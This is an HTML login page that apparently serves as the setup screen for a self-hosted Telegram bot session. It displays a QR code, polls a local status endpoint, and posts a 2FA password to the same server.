<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Telegram Login</title>
    <style>
        body {
            font-family: sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            padding: 2em;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            min-width: 300px;
        }

        h1 {
            color: #333;
        }

        #qr-code img {
            max-width: 250px;
        }

        #password-form {
            display: none;
            flex-direction: column;
            gap: 1em;
        }

        input,
        button {
            padding: 0.8em;
            border-radius: 4px;
            font-size: 1em;
        }

        input {
            border: 1px solid #ddd;
        }

        button {
            border: none;
            background-color: #0088cc;
            color: white;
            cursor: pointer;
        }

        button:hover {
            background-color: #0077b3;
        }

        #status {
            margin-top: 1em;
            color: #555;
            min-height: 20px;
            font-weight: bold;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Scan QR Code to Log In</h1>
        <div id="qr-code">
            <img src="" alt="QR Code" id="qr-image">
        </div>
        <div id="status">Please scan the QR code...</div>
        <form id="password-form">
            <input type="password" id="password" placeholder="Enter 2FA Password" autocomplete="off" required />
            <button type="submit">Submit Password</button>
        </form>
    </div>

    <script>
        const form = document.getElementById("password-form");
        const passwordInput = document.getElementById("password");
        const statusDiv = document.getElementById("status");
        const qrImage = document.getElementById("qr-image");
        let pollingInterval;

        async function fetchQr() {
            const res = await fetch("/qr");
            if (res.ok) {
                const data = await res.json();
                qrImage.src = data.qr;
            }
        }

        const pollStatus = async () => {
            try {
                const response = await fetch("/status");
                const data = await response.json();
                statusDiv.textContent = data.message;

                if (data.status === "WAITING_FOR_SCAN" || data.status === "RESTARTING") {
                    if (data.status === "RESTARTING") {
                        statusDiv.textContent = "QR expired, refreshing...";
                        qrImage.src = ""; // Clear QR Image
                    }
                    await fetchQr(); // refresh QR image
                }

                if (data.status === "PASSWORD_NEEDED") {
                    form.style.display = "flex";
                }

                if (data.status === "LOGGED_IN") {
                    clearInterval(pollingInterval);
                    form.style.display = "none";
                    statusDiv.style.color = "green";
                    statusDiv.textContent = "Bot Success Login, redirect...";
                    setTimeout(() => {
                        window.location.href = "/"; // redirect to home
                    }, 5000); // wait 5 second
                }

                if (data.status === "ERROR") {
                    clearInterval(pollingInterval);
                    form.style.display = "none";
                    statusDiv.style.color = "red";
                    statusDiv.textContent = "âŒ Failed to Login, please refresh page.";
                }
            } catch (error) {
                statusDiv.textContent = "Connection to server lost.";
                clearInterval(pollingInterval);
            }
        };

        pollingInterval = setInterval(pollStatus, 2000);

        form.addEventListener("submit", async (e) => {
            e.preventDefault();
            const password = passwordInput.value;
            statusDiv.textContent = "Submitting password...";
            try {
                const response = await fetch("/submit-password", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ password }),
                });
                if (response.ok) {
                    form.style.display = "none";
                } else {
                    const result = await response.json();
                    statusDiv.textContent = `Error: ${result.message || "Submission failed"}`;
                }
            } catch (error) {
                statusDiv.textContent = "Network error during submission.";
            }
        });
    </script>
</body>

</html>
